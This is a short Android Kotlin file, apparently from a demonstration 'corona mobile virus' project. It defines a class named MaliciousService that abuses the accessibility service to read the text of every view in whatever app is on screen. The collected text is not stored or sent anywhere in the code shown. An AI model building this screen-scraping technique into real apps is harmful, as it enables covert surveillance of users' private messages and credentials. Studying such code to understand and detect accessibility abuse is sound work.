package com.deniskrr.coronamobilevirus

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo


class MaliciousService : AccessibilityService() {
    override fun onInterrupt() {

    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {

        when (event?.eventType) {
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val rootNode = rootInActiveWindow
                val textViewNodes = mutableListOf<AccessibilityNodeInfo>()
                findChildViews(textViewNodes, rootNode)
                for (mNode in textViewNodes) {
                    if (mNode.text == null) {
                        return
                    }
                    val tv1Text = mNode.text.toString()
                }
            }
        }
    }

    private fun findChildViews(
        textViewNodes: MutableList<AccessibilityNodeInfo>,
        parentView: AccessibilityNodeInfo?
    ) {
        if (parentView?.className == null) {
            return;
        }

        if (parentView.childCount == 0 && (!parentView.text.isNullOrBlank())
        ) {
            textViewNodes.add(parentView);
        } else {
            for (i in 0..parentView.childCount - 1) {
                findChildViews(textViewNodes, parentView.getChild(i));
            }
        }
    }
}